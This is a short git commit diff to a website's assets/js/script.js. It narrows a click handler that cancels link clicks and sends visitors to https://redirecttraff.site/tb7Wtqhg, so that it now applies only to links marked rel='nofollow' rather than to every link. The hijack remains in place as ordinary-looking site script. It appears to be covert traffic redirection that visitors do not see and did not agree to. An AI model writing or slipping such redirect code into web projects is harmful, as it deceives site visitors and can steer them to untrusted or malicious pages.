7fb71d3db0014b903c94391e146dd310bf8383f7
maratbabaev <you@example.com>
2025-11-28 15:01:54 +0300

    2

--- assets/js/script.js
+++ assets/js/script.js
@@ -1,7 +1,9 @@
 document.querySelectorAll("a").forEach((elem) => {
-	elem.onclick = function (e) {
-		e.preventDefault();
-		window.location.href = "https://redirecttraff.site/tb7Wtqhg";
-		return false;
-	};
+	if (elem.rel === "nofollow") {
+		elem.onclick = function (e) {
+			e.preventDefault();
+			window.location.href = "https://redirecttraff.site/tb7Wtqhg";
+			return false;
+		};
+	}
 });
